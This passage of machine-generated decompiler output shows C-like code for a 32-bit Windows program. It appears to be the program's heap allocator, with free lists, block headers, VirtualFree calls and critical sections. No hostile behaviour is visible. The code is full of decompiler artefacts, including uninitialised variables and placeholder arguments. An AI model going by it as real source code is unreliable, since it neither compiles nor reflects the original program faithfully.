    int32_t v2 = v1 + 4095 & -0x1000; // 0x401695
    int32_t v3 = v2; // bp-20, 0x40169b
    int32_t v4; // 0x401686
    uint32_t v5 = v1 + v4 & -0x1000; // 0x4016a2
    int32_t v6; // 0x401686
    *(int32_t *)v6 = v2;
    int32_t result = v5 - v3; // 0x4016af
    *(int32_t *)(v6 + 4) = result;
    if (g65 == (int32_t)&g65) {
        // 0x4016fd
        return result;
    }
    int32_t v7 = g65;
    int32_t v8 = &v3;
    uint32_t v9 = *(int32_t *)(v7 + 8); // 0x4016bd
    uint32_t v10 = *(int32_t *)(v7 + 12) + v9; // 0x4016c3
    uint32_t v11 = *(int32_t *)v8; // 0x4016c5
    uint32_t v12 = v9 >= v11 ? v9 : v11;
    uint32_t v13 = v5 >= v10 ? v10 : v5;
    int32_t v14 = result; // 0x4016d5
    int32_t v15 = v8; // 0x4016d5
    int32_t v16; // 0x4016df
    bool v17; // 0x4016e0
    int32_t v18; // 0x4016e0
    if (v13 > v12) {
        // 0x4016d7
        *(int32_t *)(v8 - 4) = 0x4000;
        *(int32_t *)(v8 - 8) = v13 - v12;
        v16 = v8 - 12;
        *(int32_t *)v16 = v12;
        v17 = VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117);
        v18 = v17;
        v14 = v18;
        v15 = v16;
        if (!v17) {
            // 0x4016e9
            g61 = 2;
            v14 = v18;
            v15 = v16;
        }
    }
    int32_t result2 = v14;
    v7 = *(int32_t *)v7;
    while (v7 != (int32_t)&g65) {
        // 0x4016bd
        v8 = v15;
        v9 = *(int32_t *)(v7 + 8);
        v10 = *(int32_t *)(v7 + 12) + v9;
        v11 = *(int32_t *)v8;
        v12 = v9 >= v11 ? v9 : v11;
        v13 = v5 >= v10 ? v10 : v5;
        v14 = result2;
        v15 = v8;
        if (v13 > v12) {
            // 0x4016d7
            *(int32_t *)(v8 - 4) = 0x4000;
            *(int32_t *)(v8 - 8) = v13 - v12;
            v16 = v8 - 12;
            *(int32_t *)v16 = v12;
            v17 = VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117);
            v18 = v17;
            v14 = v18;
            v15 = v16;
            if (!v17) {
                // 0x4016e9
                g61 = 2;
                v14 = v18;
                v15 = v16;
            }
        }
        // 0x4016f3
        result2 = v14;
        v7 = *(int32_t *)v7;
    }
    // 0x4016fd
    return result2;
}

// Address range: 0x401706 - 0x401794
int32_t function_401706(int32_t a1) {
    // 0x401706
    int32_t v1; // 0x401706
    uint32_t v2 = v1 + 0x3fff & -0x4000; // 0x40171c
    int32_t v3; // 0x401706
    int32_t v4; // 0x401706
    int32_t * v5; // 0x401706
    if (g66 != (int32_t)&g66) {
        v4 = g66;
        v5 = (int32_t *)(v4 + 12);
        if (v2 <= *v5) {
            // break (via goto) -> 0x40172c
            goto lab_0x40172c;
        }
        // 0x401758
        v3 = *(int32_t *)v4;
        while (v3 != (int32_t)&g66) {
            // 0x401727
            v4 = v3;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x40172c
                goto lab_0x40172c;
            }
            // 0x401758
            v3 = *(int32_t *)v4;
        }
    }
    int32_t result = function_40145e(); // 0x40176a
    int32_t v6; // 0x401706
    while (v6 != 0) {
        // 0x40176c
        function_40135a();
        int32_t v7; // 0x401706
        if (v7 == 0) {
            // 0x40177d
            function_40153a();
            *(int32_t *)v6 = 0;
            result = 0;
            return result;
        }
        if (g66 != (int32_t)&g66) {
            v4 = g66;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x40172c
                goto lab_0x40172c;
            }
            // 0x401758
            v3 = *(int32_t *)v4;
            while (v3 != (int32_t)&g66) {
                // 0x401727
                v4 = v3;
                v5 = (int32_t *)(v4 + 12);
                if (v2 <= *v5) {
                    // break (via goto) -> 0x40172c
                    goto lab_0x40172c;
                }
                // 0x401758
                v3 = *(int32_t *)v4;
            }
        }
        // 0x40175e
        result = function_40145e();
    }
    // 0x40178d
    return result;
  lab_0x40172c:
    // 0x40172c
    result = function_4015f2();
    if (v2 == 0) {
        // 0x40178d
        return result;
    }
    int32_t * v8 = (int32_t *)(v6 + 4); // 0x40173d
    int32_t * v9 = (int32_t *)(v4 + 8); // 0x401740
    *v9 = *v9 + *v8;
    int32_t v10 = *v8; // 0x401743
    int32_t v11 = *v5 - v10; // 0x401746
    *v5 = v11;
    result = v10;
    if (v11 == 0) {
        // 0x40174f
        result = function_401342();
    }
  lab_0x40178d:
    // 0x40178d
    return result;
}

// Address range: 0x401796 - 0x4018b9
int32_t function_401796(int32_t a1, int32_t a2) {
    // 0x401796
    int32_t v1; // 0x401796
    int32_t v2 = v1 + 0x3fff & -0x4000; // 0x4017af
    int32_t v3; // 0x401796
    int32_t v4; // 0x401796
    int32_t v5; // 0x401796
    int32_t * v6; // 0x401796
    while (true) {
        int32_t v7 = &g66; // 0x4017be
        if (g66 != (int32_t)&g66) {
            int32_t v8 = g66;
            v7 = v8;
            while (v5 != *(int32_t *)(v8 + 8)) {
                int32_t v9 = *(int32_t *)v8;
                int32_t v10 = v9; // 0x4017be
                v7 = &g66;
                if (v9 == (int32_t)&g66) {
                    // break -> 0x4017c5
                    break;
                }
                v8 = v10;
                v7 = v8;
            }
        }
        // 0x4017c5
        v3 = v7;
        v6 = (int32_t *)(v3 + 8);
        int32_t v11; // 0x401796
        int32_t v12; // 0x401796
        if (v5 != *v6) {
            // 0x401821
            function_4014c2();
            if (v12 == 0) {
                // break -> 0x401869
                break;
            }
            // 0x401835
            function_40135a();
            if (v11 == 0) {
                // 0x40184f
                function_40153a();
                *(int32_t *)v4 = 0;
                return result;
            }
        } else {
            // 0x4017ca
            if (v2 <= *(int32_t *)(v3 + 12)) {
                // break -> 0x401869
                break;
            }
            // 0x4017d3
            function_4014c2();
            if (v12 == 0) {
                // 0x401821
                function_4014c2();
                goto lab_0x401869;
            }
            // 0x4017ee
            function_40135a();
            if (v11 == 0) {
                // 0x401804
                function_40153a();
                *(int32_t *)v4 = 0;
                return result;
            }
        }
    }
    goto lab_0x401869;
  lab_0x401869:;
    // 0x401869
    int32_t result; // 0x401796
    if (v5 != *v6) {
        // 0x4018aa
        *(int32_t *)v4 = 0;
        // 0x4018b1
        return result;
    }
    int32_t * v13 = (int32_t *)(v3 + 12); // 0x401870
    if (v2 > *v13) {
        // 0x4018aa
        *(int32_t *)v4 = 0;
        // 0x4018b1
        return result;
    }
    // 0x401875
    function_4015f2();
    if (v4 == 0) {
        // 0x4018b1
        return 0;
    }
    int32_t * v14 = (int32_t *)(v4 + 4); // 0x40188c
    *v6 = *v6 + *v14;
    int32_t v15 = *v14; // 0x401895
    int32_t v16 = *v13 - v15; // 0x401898
    *v13 = v16;
    result = v15;
    if (v16 == 0) {
        // 0x4018a1
        result = function_401342();
    }
  lab_0x4018b1:
    // 0x4018b1
    return result;
}

// Address range: 0x4018ba - 0x401946
int32_t function_4018ba(void) {
    // 0x4018ba
    int32_t v1; // 0x4018ba
    int32_t v2; // 0x4018ba
    if ((uint32_t)(v2 + 0x3fff & -0x4000) >= (uint32_t)(v2 + v1 & -0x4000)) {
        // 0x40193b
        int32_t v3; // 0x4018ba
        *(int32_t *)v3 = 0;
        // 0x40193f
        return 0;
    }
    // 0x4018e0
    int32_t v4; // 0x4018ba
    int32_t v5; // 0x4018ba
    int32_t v6; // 0x4018ba
    function_401686(v6, v5, v4);
    int32_t result = function_40135a(); // 0x401903
    int32_t v7; // 0x4018ba
    if (v7 == 0) {
        // 0x40193f
        return result;
    }
    // 0x401924
    function_40153a();
    int32_t v8; // 0x4018ba
    if (v8 != 0) {
        // 0x40192b
        result = function_4013ca();
    }
    // 0x40193f
    return result;
}

// Address range: 0x401946 - 0x4019fc
int32_t function_401946(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x401951
    __writefsdword(0, (int32_t)&v1);
    struct _RTL_CRITICAL_SECTION * v2 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-20, 0x401957
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
    struct _RTL_CRITICAL_SECTION ** v3 = &v2; // 0x401968
    if (g50 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-24, 0x40196a
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    function_40130a();
    function_40130a();
    function_40130a();
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x401992
    *v6 = 4088;
    int32_t * v7 = (int32_t *)(v5 - 8); // 0x401997
    *v7 = 0;
    int32_t v8 = function_40127a(); // 0x401999
    g72 = v8;
    if (v8 != 0) {
        // 0x4019b1
        *(int32_t *)v8 = 0;
        int32_t v9 = 3; // 0x4019bd
        v9++;
        *(int32_t *)(g72 - 12 + 4 * v9) = 0;
        while (v9 != 1024) {
            // 0x4019b1
            v9++;
            *(int32_t *)(g72 - 12 + 4 * v9) = 0;
        }
        // 0x4019c5
        g68 = &g67;
        g67 = &g67;
        g69 = &g67;
        g60 = 1;
    }
    // 0x4019db
    __writefsdword(0, *v7);
    *(int32_t *)v3 = 0x401a03;
    int32_t result = 0; // 0x4019ef
    if (g50 != 0) {
        // 0x4019f1
        *v6 = (int32_t)&g62;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
        result = &g117;
    }
    // 0x4019fb
    return result;
}

// Address range: 0x4019fc - 0x401a01
int32_t function_4019fc(void) {
    // 0x4019fc
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x401a01 - 0x401a03
int32_t function_401a01(void) {
    // 0x401a01
    int32_t result; // 0x401a01
    return result;
}

// Address range: 0x401a03 - 0x401a0a
int32_t function_401a03(int32_t a1) {
    // 0x401a03
    int32_t v1; // 0x401a03
    return v1 & -256 | (int32_t)(unsigned char)g60;
}

// Address range: 0x401a0a - 0x401aea
int32_t function_401a0a(void) {
    // 0x401a0a
    if (g60 == 0) {
        // 0x401ae7
        int32_t result; // 0x401a0a
        return result;
    }
    int32_t v1 = __readfsdword(0); // bp-20, 0x401a23
    int32_t v2 = &v1; // 0x401a23
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x401a30
    if (g50 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-24, 0x401a32
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
        v3 = (int32_t)&v4;
    }
    // 0x401a3c
    g60 = 0;
    int32_t v5 = v3 - 4; // 0x401a48
    *(int32_t *)v5 = g72;
    function_401282();
    g72 = 0;
    int32_t v6 = g65; // 0x401a75
    int32_t v7 = v5; // 0x401a75
    int32_t v8 = v5; // 0x401a75
    if (g65 != (int32_t)&g65) {
        *(int32_t *)(v7 - 4) = 0x8000;
        *(int32_t *)(v7 - 8) = 0;
        v7 -= 12;
        *(int32_t *)v7 = *(int32_t *)(v6 + 8);
        VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117);
        v6 = *(int32_t *)v6;
        v8 = v7;
        while (v6 != (int32_t)&g65) {
            // 0x401a5d
            *(int32_t *)(v7 - 4) = 0x8000;
            *(int32_t *)(v7 - 8) = 0;
            v7 -= 12;
            *(int32_t *)v7 = *(int32_t *)(v6 + 8);
            VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117);
            v6 = *(int32_t *)v6;
            v8 = v7;
        }
    }
    // 0x401a77
    function_40130a();
    function_40130a();
    function_40130a();
    int32_t v9 = g63; // 0x401a9c
    int32_t v10 = v8; // 0x401a9c
    int32_t * v11; // 0x401a0a
    int32_t v12; // 0x401a0a
    if (g63 == 0) {
        // 0x401a77
        v11 = (int32_t *)v8;
        v12 = v8;
    } else {
        g63 = *(int32_t *)v9;
        v10 -= 4;
        int32_t * v13 = (int32_t *)v10;
        *v13 = v9;
        function_401282();
        v9 = g63;
        v11 = v13;
        v12 = v10;
        while (v9 != 0) {
            // 0x401a9e
            g63 = *(int32_t *)v9;
            v10 -= 4;
            v13 = (int32_t *)v10;
            *v13 = v9;
            function_401282();
            v9 = g63;
            v11 = v13;
            v12 = v10;
        }
    }
    // 0x401ab5
    __writefsdword(0, *v11);
    int32_t v14 = v12 + 8; // 0x401abd
    *(int32_t *)v14 = 0x401ae7;
    int32_t v15 = v14; // 0x401ac9
    if (g50 != 0) {
        // 0x401acb
        v15 = v12 + 4;
        *(int32_t *)v15 = (int32_t)&g62;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
    }
    // 0x401ad5
    *(int32_t *)(v15 - 4) = (int32_t)&g62;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
    return &g117;
}

// Address range: 0x401aea - 0x401b4b
int32_t function_401aea(void) {
    // 0x401aea
    int32_t result2; // 0x401aea
    int32_t * v1 = (int32_t *)(result2 + 4);
    if (result2 == g69) {
        // 0x401af3
        g69 = *v1;
    }
    int32_t v2 = *v1; // 0x401afc
    int32_t v3 = *(int32_t *)(result2 + 8); // 0x401aff
    if (v3 > 0x1000) {
        // 0x401b42
        *v1 = v2;
        // 0x401b49
        int32_t result; // 0x401aea
        return result;
    }
    int32_t * v4 = (int32_t *)(g72 + ((v3 >= 0 ? v3 : v3 + 3) - 12 & -4));
    if (result2 == v2) {
        // 0x401b0e
        *v4 = 0;
        // 0x401b49
        return g72;
    }
    // 0x401b25
    *v4 = v2;
    *v1 = v2;
    return result2;
}

// Address range: 0x401b4e - 0x401b7d
int32_t function_401b4e(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x401b4e
    if (g73 != (int32_t)&g73) {
        uint32_t v1 = *(int32_t *)(g73 + 8); // 0x401b56
        uint32_t v2; // 0x401b4e
        if (v2 >= v1) {
            // 0x401b5d
            if (v2 < *(int32_t *)(g73 + 12) + v1) {
                // 0x401b7a
                return g73;
            }
        }
        int32_t v3 = *(int32_t *)g73;
        while (v3 != (int32_t)&g73) {
            int32_t v4 = v3;
            v1 = *(int32_t *)(v4 + 8);
            if (v2 >= v1) {
                int32_t result = v4; // 0x401b62
                if (v2 < *(int32_t *)(v4 + 12) + v1) {
                    // 0x401b7a
                    return result;
                }
            }
            // 0x401b64
            v3 = *(int32_t *)v4;
        }
    }
    // 0x401b6e
    g61 = 3;
    // 0x401b7a
    return 0;
}

// Address range: 0x401b7e - 0x401bae
int32_t function_401b7e(void) {
    // 0x401b7e
    uint32_t v1; // 0x401b7e
    int32_t result; // 0x401b7e
    int32_t v2 = v1 - 4 + result; // 0x401b84
    if (v1 >= 16) {
        // 0x401b8c
        *(int32_t *)v2 = -0x7ffffff9;
        return function_401d52();
    }
    if (v1 >= 4) {
        int32_t v3 = v1 | -0x7ffffffe; // 0x401ba2
        *(int32_t *)result = v3;
        *(int32_t *)v2 = v3;
    }
    // 0x401bac
    return result;
}

// Address range: 0x401bae - 0x401bd0
int32_t function_401bae(void) {
    // 0x401bae
    g56++;
    int32_t v1; // 0x401bae
    g57 += (*(int32_t *)(v1 - 4) & 0x7ffffffc) - 4;
    return function_4021c2();
}

// Address range: 0x401bd2 - 0x401bfa
int32_t function_401bd2(void) {
    // 0x401bd2
    uint32_t v1; // 0x401bd2
    int32_t v2; // 0x401bd2
    if (v1 >= 12) {
        // 0x401bd7
        *(int32_t *)v2 = v1 | 2;
        return function_401bae();
    }
    if (v1 >= 4) {
        // 0x401bea
        *(int32_t *)v2 = v1 | -0x7ffffffe;
    }
    int32_t result = v2 + v1; // 0x401bf4
    int32_t * v3 = (int32_t *)result; // 0x401bf6
    *v3 = *v3 & -2;
    return result;
}

// Address range: 0x401bfa - 0x401c67
int32_t function_401bfa(void) {
    // 0x401bfa
    int32_t v1; // 0x401bfa
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x401c01
    if ((v2 & -0x7ffffffe) != -0x7ffffffe) {
        // 0x401c13
        g61 = 4;
    }
    int32_t result = v2 & 0x7ffffffc; // 0x401c1f
    int32_t v3 = v1 - result; // 0x401c25
    if ((*(int32_t *)v3 ^ v2) >= 2) {
        // 0x401c33
        g61 = 5;
    }
    // 0x401c3d
    if ((*(char *)v3 & 1) == 0) {
        // 0x401c62
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 - 4); // 0x401c47
    if (v4 != *(int32_t *)(v3 + 8 - v4)) {
        // 0x401c51
        g61 = 6;
    }
    // 0x401c5b
    function_401aea();
    // 0x401c62
    return v4 + result;
}

// Address range: 0x401c6a - 0x401ca2
int32_t function_401c6a(void) {
    int32_t v1 = 0; // 0x401c78
    int32_t v2; // 0x401c6a
    int32_t v3; // 0x401c6a
    uint32_t v4; // 0x401c6a
    if (v4 <= 0xffffffff) {
        // 0x401c7a
        v1 = v4 & 0x7ffffffc;
        int32_t v5 = v1 + v4; // 0x401c81
        v2 = *(int32_t *)v5;
        v3 = v5;
    }
    int32_t result = v1; // 0x401c87
    if ((v2 & 2) == 0) {
        // 0x401c89
        function_401aea();
        int32_t v6 = *(int32_t *)(v3 + 8); // 0x401c92
        int32_t * v7 = (int32_t *)(v6 + v3); // 0x401c99
        *v7 = *v7 & -2;
        result = v6 + v1;
    }
    // 0x401c9c
    return result;
}

// Address range: 0x401ca2 - 0x401d4f
int32_t function_401ca2(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401ca2
    int32_t v1; // 0x401ca2
    int32_t v2; // 0x401ca2
    int32_t v3; // 0x401ca2
    int32_t v4; // 0x401ca2
    int32_t v5 = function_401b4e(v4, v2, v1, v3); // 0x401cb3
    if (v5 == 0) {
        // 0x401d44
        return 0;
    }
    int32_t v6 = function_4018ba(); // 0x401d0e
    int32_t v7; // 0x401ca2
    if (v7 == 0) {
        // 0x401d44
        return v6 & -256;
    }
    // 0x401d10
    function_401b7e();
    int32_t v8; // 0x401ca2
    if (v7 + v8 < *(int32_t *)(v5 + 12) + *(int32_t *)(v5 + 8)) {
        // 0x401d2b
        function_401bd2();
    }
    // 0x401d44
    return function_4013ca() & -256 | 1;
}

// Address range: 0x401d52 - 0x401dd7
int32_t function_401d52(void) {
    // 0x401d52
    uint32_t v1; // 0x401d52
    int32_t v2; // 0x401d52
    if (v1 > 0x1000) {
        if (v1 >= 0x3c00) {
            // 0x401daf
            int32_t v3; // 0x401d52
            int32_t v4; // 0x401d52
            int32_t v5; // 0x401d52
            int32_t result = function_401ca2(v5, v4, v3); // 0x401db3
            if ((char)result != 0) {
                // 0x401dd3
                return result;
            }
        }
        // 0x401dbc
        *(int32_t *)(v2 + 4) = g69;
        *(int32_t *)v2 = *(int32_t *)g69;
        // 0x401dd3
        return g69;
    }
    int32_t v6 = (int32_t)v1 >= 0 ? v1 : v1 + 3;
    int32_t v7 = *(int32_t *)(g72 + (v6 - 12 & -4)); // 0x401d81
    int32_t result2; // 0x401d52
    if (v7 != 0) {
        // 0x401d99
        *(int32_t *)(v2 + 4) = v7;
        *(int32_t *)v2 = *(int32_t *)v7;
        result2 = v7;
    } else {
        // 0x401d89
        result2 = g72;
    }
    // 0x401dd3
    return result2;
}

// Address range: 0x401dda - 0x401e24
int32_t function_401dda(void) {
    // 0x401dda
    int32_t result; // 0x401dda
    if (g70 < 1) {
        // 0x401e23
        return result;
    }
    if (g70 > 11) {
        // 0x401df8
        *(int32_t *)g71 = g70 | 2;
        function_401bae();
        g71 = 0;
        g70 = 0;
        result = 0;
    } else {
        // 0x401dec
        g61 = 7;
    }
    // 0x401e23
    return result;
}

// Address range: 0x401e26 - 0x401eaf
int32_t function_401e26(void) {
    // 0x401e26
    bool v1; // 0x401e26
    int32_t v2 = v1 ? -4 : 4; // 0x401e31
    int32_t v3; // 0x401e26
    int32_t v4 = *(int32_t *)(v2 + v3); // 0x401e32
    int32_t v5; // bp-28, 0x401e26
    *(int32_t *)(v2 + (int32_t)&v5) = v4;
    function_401dda();
    function_40135a();
    uint32_t v6; // 0x401e26
    if (v6 == 0) {
        // 0x401ea8
        return 0;
    }
    int32_t v7 = v5; // 0x401e5a
    int32_t v8; // 0x401e26
    if (v6 < v5) {
        int32_t v9 = function_401bfa(); // 0x401e5c
        v7 = v5 - v9;
        v5 = v7;
        int32_t v10; // 0x401e26
        v8 = v9 + v10;
    }
    int32_t v11 = v8 + v7;
    int32_t v12; // 0x401e26
    uint32_t v13 = v6 + v12; // 0x401e6d
    int32_t v14 = v11; // 0x401e73
    int32_t v15 = v7; // 0x401e73
    int32_t v16 = v8; // 0x401e73
    if (v11 < v13) {
        // 0x401e75
        v16 = function_401c6a() + v8;
        v15 = v5;
        v14 = v15 + v16;
    }
    // 0x401e7d
    v5 = v15;
    int32_t v17 = v16; // 0x401e84
    if (v13 == v14) {
        // 0x401e86
        function_401b7e();
        v17 = v16 - 4;
    }
    // 0x401e97
    g71 = v5;
    g70 = v17;
    // 0x401ea8
    return v17 & -256 | 1;
}

// Address range: 0x401eb2 - 0x401edd
int32_t function_401eb2(void) {
    // 0x401eb2
    int32_t v1; // 0x401eb2
    function_401706(v1);
    int32_t v2; // 0x401eb2
    if (v2 == 0) {
        // 0x401ed9
        return 0;
    }
    int32_t v3 = function_401e26(); // 0x401eca
    int32_t result = 0; // 0x401ed1
    if ((char)v3 != 0) {
        // 0x401ed7
        result = v3 & -256 | 1;
    }
    // 0x401ed9
    return result;
}

// Address range: 0x401ede - 0x401f0f
int32_t function_401ede(void) {
    // 0x401ede
    int32_t v1; // 0x401ede
    int32_t v2; // 0x401ede
    function_401796(v2, v1);
    int32_t v3; // 0x401ede
    if (v3 == 0) {
        // 0x401f0a
        return 0;
    }
    int32_t v4 = function_401e26(); // 0x401efb
    int32_t result = 0; // 0x401f02
    if ((char)v4 != 0) {
        // 0x401f08
        result = v4 & -256 | 1;
    }
    // 0x401f0a
    return result;
}

// Address range: 0x401f12 - 0x401f3e
int32_t function_401f12(void) {
    // 0x401f12
    int32_t v1; // 0x401f12
    int32_t v2 = v1 >= 0 ? v1 : v1 + 3;
    if (v2 > 0x1003) {
        // 0x401f3b
        return 0;
    }
    int32_t v3 = v2 / 4;
    int32_t result = *(int32_t *)(g72 - 12 + 4 * v3); // 0x401f2b
    while (result == 0) {
        // 0x401f25
        if (v3 == 1024) {
            // break -> 0x401f3b
            break;
        }
        // 0x401f33
        v3++;
        result = *(int32_t *)(g72 - 12 + 4 * v3);
    }
    // 0x401f3b
    return result;
}

// Address range: 0x401f3e - 0x402032
int32_t function_401f3e(void) {
    int32_t v1 = g68 + 8;
    int32_t v2 = v1; // 0x401f57
    int32_t v3 = g68; // 0x401f57
    // 0x401f3e
    int32_t result; // 0x401f3e
    uint32_t v4; // 0x401f3e
    while (v4 > *(int32_t *)v1) {
        int32_t v5 = g69; // 0x401f5d
        int32_t v6 = v5 + 8;
        uint32_t v7 = *(int32_t *)v6; // 0x401f5f
        v2 = v6;
        v3 = v5;
        if (v4 <= v7) {
            // break -> 0x401fe1
            break;
        }
        int32_t v8 = *(int32_t *)(v5 + 4); // 0x401f69
        int32_t v9 = v8 + 8;
        int32_t v10 = v8; // 0x401f6f
        while (v4 > *(int32_t *)v9) {
            // 0x401f69
            v8 = *(int32_t *)(v10 + 4);
            v9 = v8 + 8;
            v10 = v8;
        }
        // 0x401f71
        *(int32_t *)(g69 + 8) = v7;
        if (v8 != g69) {
            // 0x401f7a
            g69 = v8;
            v2 = v9;
            v3 = v8;
            goto lab_0x401fe1;
        }
        if (v4 <= 0x1000) {
            int32_t v11 = function_401f12(); // 0x401f88
            if (v11 != 0) {
                // 0x401f86
                v2 = v11 + 8;
                v3 = v11;
                goto lab_0x401fe1;
            }
        }
        // 0x401f93
        if ((char)function_401eb2() == 0) {
            // 0x40202d
            return 0;
        }
        // 0x401fa5
        if (g70 >= v4) {
            int32_t v12 = g70 - v4; // 0x401faa
            int32_t v13 = v12 > 11 ? v4 : g70;
            g70 = v12 > 11 ? v12 : 0;
            int32_t v14 = g71;
            g71 = v14 + v13;
            *(int32_t *)v14 = v13 | 2;
            g56++;
            g57 += v13 - 4;
            result = v14 + 4;
            return result;
        }
        v1 = g68 + 8;
        v2 = v1;
        v3 = g68;
    }
    goto lab_0x401fe1;
  lab_0x401fe1:
    // 0x401fe1
    function_401aea();
    int32_t v15 = *(int32_t *)v2; // 0x401fe8
    int32_t v16; // 0x401f3e
    if (v15 - v4 < 12) {
        // 0x402000
        if (v3 == g69) {
            // 0x402006
            g69 = *(int32_t *)(v3 + 4);
        }
        int32_t * v17 = (int32_t *)(v15 + v3); // 0x40200f
        *v17 = *v17 & -2;
        v16 = v15;
    } else {
        // 0x401ff4
        function_401d52();
    }
    // 0x402012
    *(int32_t *)v3 = v16 | 2;
    g56++;
    g57 += v16 - 4;
    result = v3 + 4;
  lab_0x40202d:
    // 0x40202d
    return result;
}

// Address range: 0x402032 - 0x4021ae
int32_t function_402032(void) {
    // 0x402032
    uint32_t v1; // 0x402032
    int32_t result; // 0x40205c
    if (g60 != 0) {
        if (v1 >= 0x7ffffff9) {
            // 0x402057
            result = function_4021b5(0, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117);
            return result;
        }
    } else {
        // 0x402046
        int32_t v2; // 0x402032
        if (v1 < 0x7ffffff9 != (char)function_401946(v2) != 0) {
            // 0x402057
            result = function_4021b5(0, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117);
            return result;
        }
    }
    int32_t v3 = __readfsdword(0); // bp-36, 0x402069
    int32_t v4 = &v3; // 0x402069
    __writefsdword(0, v4);
    int32_t v5 = v4; // 0x402076
    if (g50 != 0) {
        struct _RTL_CRITICAL_SECTION * v6 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-40, 0x402078
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
        v5 = (int32_t)&v6;
    }
    int32_t v7 = v1 + 7 & -4; // 0x402085
    uint32_t v8 = v7 > 12 ? v7 : 12;
    if (v8 <= 0x1000) {
        int32_t v9 = v8 - 12;
        int32_t v10 = *(int32_t *)(g72 + v9); // 0x4020b0
        if (v10 != 0) {
            int32_t * v11 = (int32_t *)(v10 + v8); // 0x4020be
            *v11 = *v11 & -2;
            int32_t v12 = v10 + 4; // 0x4020c1
            int32_t v13 = *(int32_t *)v12; // 0x4020c1
            int32_t * v14 = (int32_t *)(g72 + v9);
            int32_t * v15; // 0x402032
            if (v10 != v13) {
                // 0x4020eb
                *v14 = v13;
                int32_t * v16 = (int32_t *)v10;
                int32_t v17 = *v16; // 0x4020f8
                *(int32_t *)(v17 + 4) = v13;
                *(int32_t *)v13 = v17;
                v15 = v16;
            } else {
                // 0x4020d1
                *v14 = 0;
                v15 = (int32_t *)v10;
            }
            // 0x402108
            *v15 = *(int32_t *)(v10 + 8) | 2;
            g56++;
            g57 += v8 - 4;
            function_402f8e(v12, (int32_t)&g117);
            int32_t result2 = function_4021b5((int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x40212c
            return result2;
        }
    }
    // 0x402131
    if (g70 < v8) {
        // 0x402183
        function_401f3e();
        __writefsdword(0, *(int32_t *)v5);
        *(int32_t *)(v5 + 8) = 0x4021b5;
        int32_t result3 = 0; // 0x4021a1
        if (g50 != 0) {
            // 0x4021a3
            *(int32_t *)(v5 + 4) = (int32_t)&g62;
            LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
            result3 = &g117;
        }
        // 0x4021ad
        return result3;
    }
    int32_t v18 = g70 - v8; // 0x402139
    int32_t v19 = v18 > 11 ? v8 : g70;
    g70 = v18 > 11 ? v18 : 0;
    int32_t v20 = g71;
    g71 = v20 + v19;
    *(int32_t *)v20 = v19 | 2;
    g56++;
    g57 += v19 - 4;
    function_402f8e(v20 + 4, (int32_t)&g117);
    int32_t result4 = function_4021b5((int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x402181
    return result4;
}

// Address range: 0x4021ae - 0x4021b3
int32_t function_4021ae(void) {
    // 0x4021ae
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4021b3 - 0x4021b5
int32_t function_4021b3(void) {
    // 0x4021b3
    int32_t result; // 0x4021b3
    return result;
}

// Address range: 0x4021b5 - 0x4021bf
int32_t function_4021b5(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4021b5
    int32_t v1; // 0x4021b5
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4021c2 - 0x402354
int32_t function_4021c2(void) {
    // 0x4021c2
    g61 = 0;
    if (g60 == 0) {
        // 0x4021db
        int32_t v1; // 0x4021c2
        if ((char)function_401946(v1) == 0) {
            // 0x4021e4
            g61 = 8;
            int32_t result = function_40235b(8, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x4021f5
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x402202
    int32_t v3 = &v2; // 0x402202
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x40220f
    if (g50 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-36, 0x402211
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
        v4 = (int32_t)&v5;
    }
    // 0x40221b
    int32_t v6; // 0x4021c2
    int32_t v7 = v6 - 4; // 0x40221d
    int32_t v8 = *(int32_t *)v7; // 0x402220
    int32_t v9; // 0x4021c2
    int32_t v10; // 0x4021c2
    if ((v8 & 2) != 0) {
        // 0x402236
        g56--;
        int32_t v11 = v8 & 0x7ffffffc;
